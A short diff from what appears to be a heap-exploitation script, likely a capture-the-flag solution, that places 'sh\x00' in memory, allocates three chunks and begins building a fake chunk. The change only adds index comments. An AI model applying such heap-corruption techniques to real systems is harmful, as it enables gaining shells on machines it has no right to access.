@@ -44,9 +44,9 @@ def pwn():
 	# Place bin/sh at the tmp area
 	wtmp('sh\x00')
 
-	alloc()
-	alloc()
-	alloc()
+	alloc() # 0
+	alloc() # 1
+	alloc() # 2
 
 	fake_chunk  = p64(0)
 	fake_chunk += p64(0x8)
